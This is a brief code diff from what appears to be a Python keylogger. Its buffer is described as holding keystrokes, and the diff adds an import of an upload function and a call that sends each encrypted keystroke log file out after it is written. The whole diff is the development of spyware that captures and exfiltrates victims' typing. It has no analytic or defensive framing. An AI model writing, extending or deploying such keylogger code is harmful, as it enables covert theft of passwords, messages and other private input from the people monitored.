@@ -4,6 +4,7 @@ import time
 import uuid
 import threading
 from encryptor import encrypt_file
+from uploader import upload_file
 
 log_buffer = [] # buffer for the keystrokes
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -40,9 +41,11 @@ def flush_buffer():
 
     with open(filename, "w") as f:
         f.write(content)
+        time.sleep(0.1) 
 
     encrypt_file(filename, f"{filename}.enc")
     os.remove(filename)
+    upload_file(f"{filename}.enc")
     log_buffer.clear()
 
 def auto_flusher():
